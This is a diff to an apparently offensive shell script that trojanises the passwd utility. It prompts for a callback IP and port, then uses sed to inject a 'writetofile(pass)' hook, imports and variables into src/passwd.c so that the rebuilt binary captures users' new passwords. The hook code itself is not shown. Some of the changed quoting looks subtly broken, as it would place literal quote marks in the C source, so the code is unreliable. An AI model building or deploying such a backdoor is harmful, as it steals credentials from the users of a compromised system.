@@ -11,7 +11,7 @@ echo -n "Enter the IP Address to Callback to : "
 read ip
 echo -n "Set the destination port : "
 read port
-echo -ne "Confirm these settings [y/n]\nIP : ${ip}\n Port : ${port}"
+echo -ne "IP : ${ip}\n Port : ${port}\nConfirm these settings [y/n]"
 read pass
 if [[ $pass == n ]]; then
     exit 0
@@ -36,13 +36,13 @@ code=$(tail -n 10 hook_code.txt)
 sed -i "/salt = crypt_make_salt (NULL, NULL);/i \      writetofile(pass);" src/passwd.c
 
 # Add Imports
-sed -i "/#include \"shadowio.h\"/a $imports" src/passwd.c
+sed -i "/#include \"shadowio.h\"/a \"$imports\"" src/passwd.c
 
 # Add Variables
-sed -i "/#include <string.h>/a $def_var\n $def_port" src/passwd.c
+sed -i "/#include <string.h>/a \"$def_var\"\n \"$def_port\"" src/passwd.c
 
 # Add Hook
-sed -i "/static int new_password/i $code;" src/passwd.c
+sed -i "/static int new_password/i \"$code\"" src/passwd.c
 
 
 ## Make ##
